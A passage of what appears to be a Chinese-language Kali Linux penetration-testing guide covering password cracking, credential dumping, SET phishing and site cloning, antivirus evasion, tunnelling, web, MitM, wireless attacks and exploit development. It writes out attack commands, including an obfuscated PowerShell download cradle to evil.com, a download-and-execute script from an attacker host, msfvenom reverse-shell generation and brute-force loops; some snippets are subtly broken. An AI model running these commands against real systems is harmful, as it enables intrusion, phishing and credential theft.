在破解之前，必须识别哈希的类型。误判哈希可能导致浪费时间并得到错误的结果。

识别哈希的工具：

- `hashid`
- `hash-identifier`
- `Hashcat --example-hashes`

示例：

```
hashid -m hash.txt
```

## 使用 Hashcat 破解

`Hashcat` 是一种基于 GPU 加速的密码破解工具，以速度和灵活性著称。

基本语法：

```
hashcat -m [hash_type] -a [attack_mode] hashes.txt wordlist.txt
```

- `-m`: 哈希模式（例如，`0` 代表 MD5，`1000` 代表 NTLM）
- `-a`: 攻击模式（例如，`0` 代表字典，`3` 代表暴力破解）

示例（使用字典破解 NTLM 哈希）：

```
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
```

关键特性：

- 基于规则的变异
- 掩码攻击 `(?a?a?a?a123)`
- 混合攻击
- 使用字符集的暴力破解
- 用于高性能的 GPU 加速

## 使用 John the Ripper 破解

`John the Ripper` `JTr` 是一款功能强大的密码破解工具，支持多种哈希类型和平台。

### 模式

- 单次破解 `Single crack`：使用已知的用户名和相关信息。
- 字典 `Wordlist`：使用字典攻击。
- 增量 `Incremental`：纯暴力破解。

示例：

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

查看破解的密码：

```
john --show hashes.txt
```

### John vs. Hashcat

- `Hashcat` 更适合 GPU 破解和追求速度。
- `John` 在哈希格式和混合攻击方面更通用。

# 凭据转储与重用攻击

## 凭据转储

凭据转储是从内存或本地文件中提取明文或哈希凭据的过程。它通常用于后渗透阶段。

流行方法：

- `Mimikatz`：从内存中提取明文密码、NTLM 哈希和 Kerberos 票据。
- Windows Credential Editor `WCE`
- LSASS dump：导出 `lsass.exe` 进程内存进行离线解析。
- Empire 模块：内置的凭据收集功能。
- `pwdump`, `samdump2`, `secretsdump.py` `Impacket`

在 Metasploit 中使用 Mimikatz 的示例：

```
use post/windows/gather/credentials/mimikatz
set SESSION <session_id>
```

## 凭据重用攻击

凭据重用攻击涉及在其他系统或服务上使用收集凭据。在密码卫生较差的环境中，这种攻击是毁灭性的。

示例：

- 使用导出的域管理员凭据通过 RDP 或 SMB 访问其他服务器
- 在 Web 登录表单中重用泄露的凭据
- 使用之前破解的密钥进行 SSH 登录

工具：

- `CrackMapExec`: 在网络中扫描凭据
- `Metasploit` 模块
- 用于服务的 `Hydra`/`Medusa`

最佳实践：在各种协议 `RDP`, `SMB`, `SSH`, `HTTP` 中尝试重用凭据，以实现最大的横移动潜力。

# 使用 Crunch 创建自定义字典

预制字典如 `rockyou.txt` 很有用，但针对目标的自定义字典有效得多。

## Crunch

`Crunch` 根据特定规则创建字典，包括字符集、长度和模式。

示例：

```
crunch 8 8 -f charset.lst mixalpha-numeric -o custom.txt
```

生成所有 8 位的字母数字组合。常用的标志：

- `-t`: 模式匹配（例如 `-t @@@2023@@`）
- `-o`: 输出文件
- `-f`: 内置字符集

## Cewl

`Cewl` 是一个自定义字典生成器，爬取网站并提取关键词、名称和可能的密码候选。

示例：

```
cewl https://targetsite.com -w customlist.txt
```

选项：

- `-d`: 爬取深度
- `-m`: 最小单词长度
- `--email`: 提取电子邮件
- `--meta`: 从文档中提取元数据

用例：根据公司特定数据构建社交工程或暴力破解列表。

- 群发邮件器攻击向量
- 基于 Arduino 的 HID 攻击

# 在 Kali 中启动 SET

```
sudo setoolkit
```

启动后，你将看到一个菜单驱动的界面，提供不同类型的社会工程攻击。

# 常见的 SET 攻击场景

1. 鱼叉式钓鱼攻击向量
   - 发送包含恶意附件或链接的精心设计的电子邮件。
   - 与 Metasploit 结合以投放载荷并建立会话。
2. 网站攻击向量
   - 克隆合法的网站登录页面。
   - 收集用户在虚假页面上输入的凭据。
3. 感染性介质生成器
   - 创建嵌入 Office 文档或 PDF 中的载荷。
   - 通过电子邮件或 USB 优盘投递。

## 克隆网站和收集凭据

克隆一个受信任的网站并设置伪造登录页面是常见的钓鱼策略。`SET` 简化了这一过程，使攻击者能够在无防备的用户尝试登录时收集用户名和密码。

### 克隆和收集的步骤

启动 `SET` 并选择：

`Social-Engineering Attacks > Website Attack Vectors > Credential Harvester Attack Method`

1. 选择 Site Cloner 并输入目标网站的 URL（例如 `https://www.facebook.com`）。
2. `SET` 将在本地克隆网站并使用 Apache 或 Python HTTP 服务器托管它。

一旦受害者访问伪造链接并输入凭据，信息将保存在本地：

```
/var/www/html/
```

3. 攻击者可以监控终端以实时捕获凭据。

### 增强真实性的技巧

- 使用错别字攻击域名（例如，`micr0soft.com`）
- 通过带有虚假或自签名证书的 HTTPS 部署部署
- 在可信的钓鱼邮件中嵌入链接

## 通过电子邮件投递恶意载荷

电子邮件仍然是恶意载荷最流行的投递向量之一。`SET` 和 `Metasploit` 等工具允许攻击者制作包含附件或武器化文档链接的可信电子邮件。

### 邮件载荷的类型

- 启用宏的 Office 文档
  - 嵌入触发反向 Shell 的 VBA 宏
- PDF 漏洞利用
  - 利用 PDF 阅读器的漏洞执行代码。
- HTA `HTML` 应用 文件
  - 与 PowerShell 结合用于内存中载荷。
- 可执行文件 `EXE`
  - 以伪装应用程序的形式发送（如发票、工作机会）。

### 制作邮件的工具

- `SET` 的 Mass Mailer Attack
- 用于生成载荷的 `msfvenom`
- 用于伪造 SMTP 投递的 Python 脚本

### 示例：使用 SET 发送钓鱼邮件

启动 `SET`：

`Social-Engineering Attacks > Spear-Phishing Attack Vectors`

选择：

`Perform a Mass Email Attack > Create a FileFormat Payload`

1. 选择载荷的类型（例如，嵌入 Metasploit 载荷的 PDF）。
2. 制作并发送带有诱人信息和附件的自定义电子邮件。

#### 注意事项

- 始终在受控的、基于权限的环境中使用这些技术。
- 确保钓鱼模拟有明确的范围并记录日志。

# 绕过用户意识和防御

即使有用户培训和意识活动，社会工程师也会找到创造性的方法来绕过常见的防御。成功在于利用心理触发因素，如恐惧、好奇、紧迫和权威。

## 心理策略

- 紧迫性：“除非立即行动，否则您的账户将被锁定。”
- 权威：伪装成人事部门、IT 支持或管理层。
- 稀缺性：“限时优惠——点击此处。”
- 好奇：“附上机密薪审查文档。”

## 规避检测的技术

- 混淆：使用编码 `Base64`, `Unicode` 或加壳器来隐藏恶意载荷。
- 代码注入：使用签名脚本或将载荷注入合法进程。
- 内存中执行：通过直接在内存中执行 shellcode 或 PowerShell 脚本来避免写入磁盘。
- 自定义载荷：修改 Metasploit 生成的载荷以避免基于签名的检测。

## 规避工具

- `Veil-Framework`：载荷混淆和反病毒软件规避



- `Unicorn`：基于 PowerShell 的攻击生成
- `Nishang`：PowerShell 利用框架
- `Empire`：执行复杂的、隐蔽的后渗透攻击

# 用户意识失效的示例

- 伪造的公司域名（例如，带有西里字母“a”的 it-support@company.com）
- 托管在克隆 SharePoint 站点上的假内部调查
- Dropbox 或 Google Docs 钓鱼页面

# 绕过防火墙和反病毒系统

随着安全系统的日益成熟，现代网络通常配备了防火墙、反病毒 `AV` 软件和终端检测与响应 `EDR` 平台。这些机制通过检测、记录和阻止可疑活动及载荷来防御传统的攻击向量。对于渗透测试和红队来说，理解并绕过这些防御对于模拟真实的威胁场景以及评估组织安全态的稳健性至关重要。

本章探讨了使用混淆、自定义载荷、隧道和规避框架绕过此类防御的高级技术。目标是保持隐藏足够的时间，以展示真实攻击者可以完成什么，并帮助安全团队填补漏洞。

## 混淆和编码技术

混淆涉及修改代码或载荷，使其防御工具难以分析或检测。反病毒软件严重依赖签名和启发式分析，因此更改漏洞的外观或行为可以规避检测。

混淆类型：

- 1. 代码混淆
在不改变逻辑的情况下更改语法（例如，变量重命名、虚拟函数）。
- 2. 编码技术
对载荷进行 Base64、十六进制或 Unicode 编码。
有助于在脚本或 URL 中隐藏恶意内容。
- 3. 载荷加密
使用自定义加密方案或加壳器掩盖载荷，直到运行时。

## 示例：混淆 PowerShell

```
## 原文
Invoke-Expression (New-Object
Net.WebClient).DownloadString("http://evil.com/payload.ps1")
```

```
# 混淆
$w='Net.WebClient';$d='DownloadString';(New-Object ($w)).($d)("http://evil.com/payload.ps1")
```

# 混淆工具

- `Invoke-Obfuscation`：PowerShell 混淆器
- `Obfuscator.io`：JavaScript 混淆
- `Gcat`：用于 Base64 加密的反向 Shell

# 使用 Veil 和 Shellter 生成自定义载荷

为了绕过 AV 检测，生成自定义载荷是一项至关重要的策略。来自 Metasploit 等工具的载荷经常会被 AV 标记。`Veil` 和 `Shellter` 等工具可以生成完全混淆和多态二进制文件，这些文件更难检测。

## Veil 框架

`Veil` 用于生成规避 AV 的载荷，通常使用 Python、PowerShell 或 C 语言。

### 生成载荷的步骤

```
sudo veil
```

- 1. 选择 Evasion（规避）
- 2. 选择语言（例如，Python）
- 3. 配置载荷（例如，反向 Shell）
- 4. 输出执行文件和用于 Metasploit 的配置

载荷示例：
- `veil-evasion > python/meterpreter/rev_https`

`Veil` 可以结合：
- AES 加密
- 函数级混淆
- 环境变量操作

## Shellter

`Shellter` 将载荷注入到合法的 Windows 执行文件中，创建多态木马。

### 关键功能

- 同时支持自动和手动模式
- 保留主机执行文件的原始功能
- 动态修改 shellcode 以避免检测

### 工作流

- 1. 选择一个干净的可执行文件（例如，`Notepad.exe`）
- 2. 选择载荷（reverse TCP, meterpreter）
- 3. 在 Kali 中通过 Wine 运行 Shellter

# 隧道和规避技术

防火墙通常会阻止特定的端口、协议或攻击载荷。为了绕过这些限制，攻击者使用隧道将流量封装在允许的协议中，或通过受信任的服务进行路由。

## SSH 和 VPN 隧道

- 使用 SSH 隧道将流量从禁用端口转发到允许的端口。
- VPN 可以加密并隐藏流量。

## DNS 隧道

`dnscat2` 或 `iodine` 等工具允许通过 DNS 查询进行数据外泄或 C2 通信。

```
iodine -f -P password tun.example.com
```

## HTTP/S 隧道

使用以下工具将反向 Shell 连接封装在 HTTP 或 HTTPS 流量中：
- `Meterpreter reverse_httpss`
- `Chisel`
- `Proxifier + Socat`

## 云端隧道

滥用信任的服务，例如：
- Google Drive
- Dropbox
- GitHub（用于托管负载）
- Slack 或 Telegram（用于 C2）

## 逃逸工具

- `FoxyProxy`：基于浏览器的代理控制
- `FRP`（快速反向代理）：端口转发和隧道
- `Covenant` 和 `Mythic`：具有隐身隧道能力的 C2 框架

## 理解端点保护机制

要绕过系统，必须首先了解是什么在保护它。现代安全工具不仅限于杀毒软件（AV），还包含了一套行为和启发式系统：

端点保护的关键组件：
- 1. 基于签名的杀毒软件
匹配已知的恶意软件签名（通过修改代码可以轻松绕过）。
- 2. 启发式分析
标记异常行为（例如内存注入、进程空洞）。
- 3. 行为监控
跟踪文件在执行期间的行为（例如访问 `LSASS.exe`）。
- 4. 端点检测与响应 `EDR`
高级日志记录和遥测，结合实时拦截和告警。
- 5. 沙箱
在受控环境中执行可疑文件以分析行为。

### 绕过技术

- 离地攻击二进制文件 `LOLBins`
使用 Windows 内置工具如 `certutil`、`mshta` 或 `powershell` 来执行恶意任务。
杀毒软件很难在不冒及系统功能的情况下进行拦截。
- 内存执行
仅在 RAM 中运行负载，避免写入磁盘。
- 签名二进制滥用
劫持受信任的已签名执行文件以执行恶意代码。
- DLL 侧侧加载
在信任的应用程序旁边放置恶意 DLL，让程序在运行时加载这些 DLL。

# 使用 Kali Linux 进行 Web 应用测试

由于 Web 应用暴露在公共互联网上并经常处理敏感数据，它们是攻击者最常见的目标之一。`Kali Linux` 拥有强大的安全工具军库，是识别和利用 Web 应用漏洞的理想选择。本章将深入探讨 Web 应用测试的要点，重点关注常见漏洞、Kali Linux 中的可用工具以及手动测试与自动化测试方法之间的权衡。

## Web 漏洞概述 `OWASP Top 10`

`OWASP Top 10` 是一份广受认可的 Web 应用最关键安全风险列表。对于任何 Web 应用渗透测试人员来说，理解这些风险是基础性的。

- 1. 访问控制失效
用户权限执行不当导致攻击者能够访问未授权的资源。
- 2. 密码学故障
加密脆弱或配置不当导致数据泄露。
- 3. 注入攻击
包括 SQL、OS 和 LDAP 注入。当不受信的数据被作为命令或查询的一部分发送给解释器时，就会发生这种情况。
- 4. 不安全的设计
应用程序架构存在根本性缺陷，使其容易被利用。
- 5. 安全配置错误
默认设置、不必要的服务或不完全的安全加固。
- 6. 漏洞和过时的组件
使用具有已知缺陷的库和框架。
- 7. 识别和认证失效
糟糕的身份验证和会话管理实践（例如弱密码、无多因素认证）。
- 8. 软件和数据完整性失效
软件更新受损或 CI/CD 流水线问题。
- 9. 安全日志和监控失效
缺乏检测能力。
- 10. 服务端请求伪造 `SSRF`
当服务器根据用户输入获取远程资源，可能会暴露内部系统。

## SQL 注入、`XSS`、`CSRF` 和 `LFI/RFI`

### SQL 注入 `SQLi`

当未过滤的用户输入用于数据库查询时，就会发生 SQL 注入，允许攻击者操纵或提取数据库内容。

示例：

```
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

工具：
- `sqlmap`：自动化 SQL 注入检测和利用。
- `Burp Suite`：手动篡改请求参数。

### 跨站脚本 `XSS`

在他人查看的 页面中注入恶意 JavaScript。
- 存储型 XSS：脚本永久存储在服务器上。
- 反射型 XSS：脚本从 Web 服务器反射。
- DOM 变 XSS：对客户端的 DOM 进行操作。

负载示例：

```
<script>alert('XSS')</script>
```

工具：
- `XSStrike`
- `Burp Suite` 的 `Intruder` 和 `Repeater`

### 跨站请求伪造 `CSRF`



欺骗用户在已认证的 Web 应用上执行未想要的操作。

## 漏洞利用示例：

```
<img src="http://bank.com/transfer?amount=1000&to=attacker_account">
```

## 检测技巧：

- 寻找改变状态的操作（`POST`/`PUT`/`DELETE`）。
- 检查缺少 `CSRF` 令牌。

## 工具：

- `Burp Suite`（手动）
- `OWASP ZAP`

## 本地文件包含 (LFI) 和远程文件包含 (RFI)

`LFI` 允许攻击者包含本地系统的文件。

`RFI` 通过 URL 包含远程文件。

检测：

- 检查动态包含点。

工具：

- `wfuzz`
- `Burp Suite`
- `Dirb`
- `Gobuster`

## 手动 vs 自动化 Web 测试

### 手动测试

优势：

- 允许创造力和逻辑发挥。
- 更擅长发现逻辑缺陷。

手动任务：

- 对单个参数进行模糊测试。
- 审查应用程序逻辑。
- 构建利用负载。

工具：

- `Burp Suite`
- 浏览器开发者工具
- `Curl`/`Wget`
- `Postman`

### 自动化测试

优势：

- 速度快高效。
- 覆盖大量端点。
- 有于识别常见问题（例如，过时的组件、暴露的文件）。

自动化工具：

- `Nikto`：Web 服务器问题。
- `sqlmap`：SQLi。
- `OWASP ZAP`：全自动扫描。
- `Wfuzz`, `Gobuster`：目录暴力破解。

局限性：

- 误报率高。
- 可能会错过逻辑缺陷。
- 破坏生产环境应用的风险。

## 混合方法

最有效的 Web 渗透测试结合了手动和自动化技术：

- 1. 从侦察和自动扫描开始，识别潜在漏洞。
- 2. 手动验证并利用高价值目标。
- 3. 记录漏洞并提供修复方案。

# 网络嗅探与流量分析

网络嗅探和流量分析是渗透测试中的基础技术，允许安全专业人员监控、拦截和分析在网络中传输的数据包。这些技术可以揭示有关网络基础设施、用户活动、协议以及漏洞分析的宝贵信息。在本章，我们将探索用于有效网络嗅探的工具和策略，重点关注使用 `Wireshark` 和 `Tcpdump` 捕获并分析流量、识别敏感数据，以及执行 ARP 欺骗和中间人 (`MitM`) 提取等高级攻击。

# 使用 Wireshark 和 Tcpdump 捕获数据包

### Wireshark

`Wireshark` 是一款强大的图形化网络协议分析器，允许用户实时或从保存的数据包捕获文件（PCAPs）检查网络流量。由于其丰富的特性集和应用场景，它非常适合初学者和专业人士。

关键特性：

- 具有实时数据包显示的 GUI
- 使用显示过滤器进行的高级过滤
- 协议解码和颜色编码
- 导出对象（例如图像、可执行文件）
- SSL/TLS 的 解密支持（需有相应密钥）

### 常见用例：

- 分析登录表单是否存在暴露的凭据
- 识别 DNS 泄露或不安全的协议
- 查看 HTTP 请求、头部和负载

### 基础用法：

`wireshark`

一旦启动，选择合适的网络接口以开始捕获。

使用显示过滤器，例如：

```
http
ip.addr == 192.168.1.10
tcp.port == 80
```

### Tcpdump

`Tcpdump` 是 Kali Linux 内置的一个强大的命令行数据包分析器。它非常级，适用于远程数据包捕获或脚本化。

### 示例用法：

```
tcpdump -i eth0
tcpdump -i wlan0 -w capture.pcap
tcpdump -nn port 80
```

有用选项：

- `-i <interface>`: 指定网络接口
- `-w <file>`: 将输出写入捕获文件
- `-nn`: 不解析名称
- `-v`, `-vv`: 增加详细性

`Tcpdump` 也可以用于在被攻破的主机上隐蔽或远程捕获数据。

# 分析明文和加密流量

## 明文协议

某些协议在不加密的情况下传输数据。捕获这些协议的流量可以立即暴露敏感数据。

示例：

- `HTTP`: URL、头部、表单数据
- `FTP`: 用户名和密码
- `Telnet`: 全明文会话
- `SMTP`/`IMAP`/`POP3` (无 SSL): 邮件内容

`Wireshark` 提示：使用如下过滤器：

```
ftp
telnet
http.request.method == "POST"
```

## 加密协议

加密流量如 `HTTPS`、`SSH` 或 VPN 隧道除非可以解密，否则无法轻易检查。

### 解密选项：

- SSL/TLS 解密（需要私钥或会话密钥）
- 使用 `Burp Suite` 等代理工具在客户端捕获解密数据
- 降级攻击（在高级 MitM 场景中）

### 使用 Wireshark 进行 SSL/TLS 解密：

如果你有私钥：

- 转到 `Edit > Preferences > Protocols > TLS`
- 设置 `RSA Keys List` 或 `SSL debug file`

注意：现代浏览器使用临时密钥（例如 `ECDHE`），这使得基于密钥的解密失效。

### 识别协议和敏感数据

一旦捕获了数据包，下一步是识别正在使用哪些协议并搜索宝贵数据。

## 识别协议

`Wireshark` 自动检测大多数常见协议：

- 查看 `Wireshark` 中的 Protocol 列
- 使用如 `tcp`, `udp`, `dns`, `dhcp`, `smb`, `ntlmsp` 等过滤器

## 敏感数据发现

寻找目标：

- 用户名和密码
- 会话 Cookie
- API 令牌
- 内部 IP 地址和主机名
- 软件横幅和版本号

`Wireshark` 过滤器：

```
http.auth
ftp.request.command == "USER"
tcp contains "password"
```

重组对象：

`Wireshark` 可以提取通过 `HTTP`、`FTP`、`SMB` 传输的文件：

- 转到 `File > Export Objects > HTTP`

分析 DNS 泄露：

```
dns
```

检查可能指示恶意软件、`C2` 通道或数据泄露的域名请求。

# ARP 欺骗与中间人攻击

### ARP 欺骗基础

地址解析协议 (`ARP`) 用于在本地网络上将 IP 地址映射到 MAC 地址。它是未经认证的，因此容易受到欺骗。

### ARP 欺骗工具：

- `arpspoof` (来自 `dsniff` 套件)
- `Ettercap`
- `Bettercap`

### 示例 (`arpspoof`):

`arpspoof -i eth0 -t 192.168.1.100 192.168.1.1`

这告诉受害者 (`192.168.1.100`) 你（攻击者）是网关 (`192.168.1.1`)，拦截所有流量。

## 中间人 (MitM) 攻击

一旦 ARP 欺骗成功，攻击者可以：

- 嗅探流量：实时查看未加密的数据
- 修改流量：注入脚本或恶意内容
- 降级 HTTPS：在不安全的应用移除 SSL/TLS

## Ettercap 使用：

`ettercap -T -q -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/`

### Bettercap：

更现代且强大，具有 HTTPS 剥离和注入能力。

`bettercap -iface eth0`

在交互式 shell 中：

`net.probe on`

`net.sniff on`

`arp.spoof on`

### 注意事项：

- 仅在实验室环境或获得明确授权后执行这些攻击。
- 许多现代操作系统和网络会检测 ARP 投毒并拦截流量。

# 无线与蓝牙破解

无线和蓝牙破解已成为渗透测试中的关键领域，特别是随着 Wi-Fi 网络、蓝牙功能设备和 IoT 系统的普及。与有线网络不同，无线通信是广播的，容易受到各种攻击，包括窃听、冒充、未经授权的访问和利用。在本章，我们将深入扫描和映射无线网络、利用蓝牙漏洞、设置恶意接入点和蜜罐，以及针对 IoT 设备的攻击。

# 无线网络的扫描与映射

任何无线渗透测试的第一步都是侦察——识别接入点 (`APs`)、客户端、通道、加密方法。

### 工具与技术

**`airmon-ng` 和 `airodump-ng`** (`Airc-ng` 套件)

**开启监听模式：**

```
airmon-ng start wlan0
```

- **扫描网络：**

  `airodump-ng wlan0`

`airodump-ng` 提供了实时概览：

- **SSID 和 BSSID**（网络名称和 MAC 地址）
- 通道和信号强度
- 加密方式 (`WEP`/`WPA`/`WPA2`/`WPA3`)
- 连接客户端数量及其 MAC 地址

`kismet`

- 高级无线检测器、嗅探和 IDS。
- 记录完整的无线流量，包括隐藏 SSID、客户端关联和信号追踪。

`wigle.`

- 全球 Wi-Fi 网络映射数据库。
- 适用于红队侦察型任务。

### 识别隐藏 SSID



当 SSID 广播禁用时，SSID 字段可能为空。然而，`airodump-ng` 和 `kismet` 可以通过观察帧、探测请求或设备连接 AP 时发现隐藏 SSID。

# 利用蓝牙设备

蓝牙是一种短距离无线协议，用于耳机、手机、计算机、IoT 和医疗设备之间的通信。像 Wi-Fi 一样，如果配置不当或使用旧，它可以被利用。

## 蓝牙侦察

`hcitool`

扫描附近蓝牙设备的基础命令行工具：

`hcitool scan`

## bluetoothctl

管理蓝牙连接并执行配对或信息收集的交互工具。

# l2ping

Ping 蓝牙设备以确认连接性：

`l2ping -c 5 <MAC>`

## bluelog

蓝牙设备追踪工具，记录带有信号强度和时间的可见设备。

## 常见漏洞

- 默认 PIN 配对（例如 `0000`，`1234`）
- 未修补的固件
- `BlueBorne`：严重漏洞套件，允许攻击者在无需配对的情况下通过蓝牙控制设备。

## 攻击与工具

# btscanner

- 设备配置服务的 GUI 扫描器。
- 识别 `OBEX`、串口配置文件 (`SPP`)、音频网关等。

`carwhisperer`

- 利用支持蓝牙的汽车套件和耳机的漏洞来注入或录制音频。

`bluetooth-hcidump`

- 蓝牙 HCI（主机控制器接口）数据包的分析器。

注意：在扫描或攻击蓝牙设备之前，务必获得明确许可，特别是在公共或专业环境中。

## 恶意访问点创建与蜜罐

恶意访问点是一个用于伪造的 Wi-Fi AP，它模拟合法网络以吸引毫无防备的用户。一旦连接，攻击者就可以拦截流量、捕获凭据并进行中间人攻击。

## 邪生孪攻击 (Evil Twin Attacks)

工具：

- `airbase-ng`
- `Wifiphisher`
- `hostapd`
- `Bettercap`

使用 `airbase-ng` 的示例：

```
airbase-ng -e "Free_WiFi" -c 6 wlan0mon
```

## Wifiphisher

自动化创建钓鱼式伪造 AP：

- 请求 Wi-Fi 密码的强制门户
- 固件升级诈骗
- 凭据收集器

## 示例：

`wifiphisher`

## 蜜罐

蜜罐是故意设计的易漏洞系统，旨在吸引攻击者并监控其行为。

## Karma

响应所有探测请求的恶意 AP，欺骗客户端进行连接。

## Mana 工具包

基于 Karma 构建的高级恶意 AP 套件，支持 SSL 剥离、凭据收集和强制门户。

用例：

- 员工安全意识测试
- 恶意软件活动跟踪
- 恶意行为者的行为分析

> 安全提示：现代操作系统可能会检测强制门户或可疑 AP 行为。使用 SSID 隐藏、MAC 随机化和客户端指纹来实现隐身。

# IoT 设备枚举与攻击

物联网（IoT）的兴引入引入数千支持无线设备——从恒温器到智能电视——许多设备默认情况下是不安全的。IoT 渗透重点在于识别设备、利用开放服务以及访问敏感数据或控制机制。

## IoT 枚举技术

- 网络扫描：使用 `nmap` 或 `masscan` 发现已连接的 IoT 设备。
- MAC 厂商查询：帮助识别设备制造商。
- UPnP/SSDP 发现：设备通常暴露服务用于远程配置。

```
nmap -sU -p 1900 --script=ssdp-discover <target>
```

- `Shodan`：用于暴露设备的全球范围搜索引擎。

## 常见漏洞

- 默认凭据（`admin:admin`, `root:1234`）
- 带有硬编码密码的不安全固件
- Telnet、FTP 或 HTTP API 等开放服务
- 通过配置不当的执行远程代码

## IoT 攻击工具

- `Binwalk`：用于固件分析和提取
- `Firmware-Mod-Kit`：修改并重新封装固件镜像
- `Hydra`：对 Web 和服务的登录进行破解
- `Metasploit`：包含特定的 IoT 模块

## Telnet 攻击示例：

```
hydra -L users.txt -P passwords.txt telnet://192.168.1.30
```

## 利用 MQTT（常用 IoT 协议）：

使用 `mosquitto_sub` 和 `mosquitto_pub` 在有漏洞的代理上订阅/发布主题。

## 编写自定义利用程序和脚本

编写自定义利用程序和脚本是高级渗透测试的基石。虽然像 `Metasploit` 这样的预构建工具和框架非常强大，但在某些情况下，编写自己的利用程序或自动化脚本变得非常必要——可能是因为缺乏公开利用程序、需要规避检测或特定的任务需求。在本章中，我们将深入探讨利用程序开发的基础，涵盖缓冲区溢出等关键漏洞类型，探索使用 Python、Bash 和 PowerShell 脚本，并学习有效地自动化渗透测试任务。

## 利用程序开发基础

利用程序开发是编写代码以利用软件、服务或系统中漏洞的过程。目标是通过利用以下缺陷操纵执行流或获得未经的访问：

- 缓冲区溢出
- 格式字符串漏洞
- 命令注入
- 使用后释放 (`Use-after-free`)
- 权限提升漏洞

## 理解漏洞

在编写利用程序之前，渗透测试人员必须完全理解漏洞：

- 什么导致了 bug（输入、内存管理缺陷、配置错误）？
- 是否可以可靠地触发？
- 是否已知系统架构和软件版本？
- 有哪些缓解机制（`DEP`、`ASLR`、栈保护）？

## 利用程序开发工作流

1. 侦察：使用 `nmap`、`dirb` 和 `gobuster` 等工具识别有漏洞的服务或软件版本。
2. 漏洞研究：检查 `CVE`、`Exploit-DB` 和厂商建议。
3. 概念验证 (`PoC`)：编写一个导致崩溃或演示 bug 的脚本。
4. Shellcode 注入：嵌入自定义或生成的负载。
5. 绕过保护：规避 `DEP`/`ASLR` 等缓解措施。
6. 可靠的利用：使其稳定、可重复且侵入性最小。

`GDB`、`pwndbg`、`Radare2` 和 `Immunity Debugger` 等工具对于动态分析和利用程序制作至关重要。

## 缓冲区溢出与 Shellcode 注入

缓冲区溢出是最古老且被利用最多的漏洞之一，当数据超过分配的缓冲区并覆盖相邻内存时发生，可能会覆盖函数返回地址并重定向执行。

## 简单的栈栈缓冲区溢出解析

有漏洞的 C 代码：

```c
void vuln(char *input) {
  char buffer[64];
  strcpy(buffer, input);
}
```

1. 利用策略：
   - 发送 >64 字节的输入以覆盖返回地址。
   - 注入 shellcode 或跳转到 NOP 滑块。

生成 Shellcode：

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

2. Python 利用程序脚本：
   - `offset = 64`

```python
ret = b"\x90\x90\x90\x90" * offset # 替换为 offset 和实际地址
payload = b"A" * offset + ret + shellcode
```

## 利用程序缓解绕过

- 用于 `ASLR` 的 NOP 滑块
- 用于绕过 `DEP` 的 ROP 链
- Return-to-libc 攻击
- 栈转移 (`Stack pivoting`)

Shellcode 必须满足：

- 无空字节
- 特定于平台和架构
- 如果通过 Web或其他输入向量传递，则经过仔细编码

## 在渗透测试中使用 Python、Bash 和 PowerShell

脚本对于自动化、利用、数据解析和负载生成至关重要。每种脚本语言都根据环境提供独特的优势。

## Python

- 优势：跨平台、拥有 sockets、HTTP 等库。
- 常见用途：
  - 利用程序开发
  - 自定义扫描器和破解器
  - 与 `Metasploit` 或 `Shodan` API 接口
  - 负载传递工具

示例：简单端口扫描器

```python
import socket
```

```python
def scan(target, ports):
    for port in ports:
        try:
            sock = socket.socket()
            sock.connect((target, port))
            print(f"[{port}] Port open")
            sock.close()
        except:
            pass
```

## Bash

- 优势：Linux 原生，适用于快速自动化和工具链。
- 常见用途：
  - 使用 `nmap`、`nikto`、`wpscan` 等工具进行自动化
  - 使用 `curl`、`wget` 文件上传/下载
  - 本地权限提升枚举

示例：破解 SSH 的 Bash 循环



```bash
for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
        sshpass -p $pass $user@192.168.1.1 -o StrictHostKeyChecking=no -o ConnectTimeout=5
    done
done
```

## PowerShell

- 优势：Windows 原生、访问 COM 对象、WMI、`.NET API`

- 常见用途：

  - 后渗透任务

  - 系统信息和持久化

  - 横向移动和凭据访问

  - 绕过 AV 和 UAC

示例：下载并执行负载

```powershell
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://attacker/payload.exe", "$env:TEMP\payload.exe")
Start-Process "$env:TEMP\payload.exe"
```

> 提示：使用 `Invoke-Obfuscation` 等工具对 PowerShell 脚本进行混淆以避免检测。

## 自动化任务与编写简单工具

自动化可以节省时间并减少测试中的错误。通过构建小型专用工具，你可以简化：

- 主机发现

- 字典列表生成

- 遍历

- 漏洞利用链

- 报告编写

## 构建暴力破解脚本 (Python)

```python
import requests
```

```python
url = "http://target/login"
with open("users.txt") as users
```

## 使用 Bash 自动化工具链

组合用于 Web 应用测试的工具：

```bash
nmap -p 80,4443 --open -oG web_hosts.txt 192.168.1.0/24
cat web_hosts.txt | grep 80 | awk '{print $2}' | while read host; do
  nikto -h http://$$host >> $host.txt
  dirb http://$$host >> $host.txt
done
```

## 创建可复用的 Payload 生成器

构建 Shell 脚本来封装 `msfvenom`，并将 Payload 编码为不同格式（十六进制、base64 等），以便通过经过过滤通道进行传输。

## 红队对抗与模拟攻击

红队代表了攻性安全行动的巅峰。它通过模拟真实世界威胁攻击者的行为，超越了传统的渗透测试，以评估组织的检测和响应能力。渗透测试通常侧于发现漏洞和配置错误，而红队行动则评估组织的人员、流程和技术在多大程度上能够防御高水平的对手。

本章将探讨红队行动及其与蓝队、紫队的区别，如何计划和执行模拟攻击、命令与控制 `C2` 框架的使用，以及行动后报告和简报的最佳实践。

## 红队 vs 蓝队 vs. 紫队详解

理解组织安全态势中的不同角色，对于设计有效的红队演练至关重要。

### 红队（攻击性）

- 目标：模拟真实的对抗攻击，以测试检测、预防和响应机制。

- 重点领域：社会工程学、钓鱼、横向移动、隐蔽、规避防御、持久化。

- 工具：`Cobalt Strike`, `Metasploit`, `Empire`, `Covenant`，自定义 Payload。

### 蓝队（防御性）

- 目标：检测、预防和响应安全事件及入侵。

- 重点领域：日志分析、SIEM 调优、威胁狩猎、事件响应、防火墙/规则执行、终端监控。

- 工具：`Splunk`, `ELK`, `Wireshark`, `EDR/XDR` 工具，`Zeek`, `OSSEC`。

### 紫队（协作性）

- 目标：弥合红蓝队之间的差距，协作增强检测和响应能力。

- 重点领域：与蓝队分享红队的见解以改进防御；在攻击期间使用检测脚本。

- 工具：`MITRE ATT&CK` 映射，`Atomic Red Team`, `CALDERA`, 自定义模拟。

